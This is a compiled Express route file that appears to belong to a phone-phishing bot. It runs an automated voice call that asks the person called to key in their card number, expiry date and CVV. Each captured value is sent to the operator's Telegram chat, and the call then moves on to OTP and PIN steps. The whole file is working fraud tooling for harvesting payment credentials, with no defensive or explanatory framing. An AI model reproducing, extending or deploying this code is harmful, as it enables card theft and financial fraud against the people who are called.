"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("../..");
const __2 = require("../");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__2.app.all('/calls/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { cardType, isAccount, expiry, cvv, variables } = req.query;
    const { language, chatId, step } = req.params;
    const { dtmf } = JSON.parse(variables);
    if (!dtmf) {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call STEP STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangStep)({
                            step: isAccount === 'yes' ? '1' : cvv === 'yes' ? '2' : '3',
                            cardType: cardType !== 'undefined' ? String(cardType) : ``,
                            dtmf,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
                    },
                },
            ],
        });
    }
    if (isAccount === 'yes') {
        if (!(dtmf.lengt > 15 && dtmf.length < 16)) {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call STEP STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangStep)({
                                step: `4`,
                                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                dtmf,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 18,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 18,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
                        },
                    },
                ],
            });
        }
        if (dtmf) {
            yield __1.bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
                parse_mode: 'HTML',
            });
        }
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call STEP STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangStep)({
                            step: `5`,
                            cardType: cardType !== 'undefined' ? String(cardType) : ``,
                            dtmf,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
                    },
                },
            ],
        });
    }
    if (expiry === 'yes') {
        if (!/^[0-9]{4,6}$/.test(dtmf)) {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call STEP STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangStep)({
                                step: `6`,
                                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                dtmf,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 18,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 18,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
                        },
                    },
                ],
            });
        }
        if (dtmf) {
            yield __1.bot.telegram.sendMessage(chatId, `Expiration date <b>${dtmf}</b> ✅`, {
                parse_mode: 'HTML',
            });
        }
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call STEP STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangStep)({
                            step: `7`,
                            cardType: cardType !== 'undefined' ? String(cardType) : ``,
                            dtmf,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
                    },
                },
            ],
        });
    }
    if (cvv === 'yes') {
        if (!/^[0-9]{3,4}$/.test(dtmf)) {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call STEP STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangStep)({
                                step: `8`,
                                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                dtmf,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
                        },
                    },
                ],
            });
        }
        if (dtmf) {
            yield __1.bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
                parse_mode: 'HTML',
            });
        }
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call STEP STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangStep)({
                            step: `9`,
                            cardType: cardType !== 'undefined' ? String(cardType) : ``,
                            dtmf,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
                    },
                },
            ],
        });
    }
}));
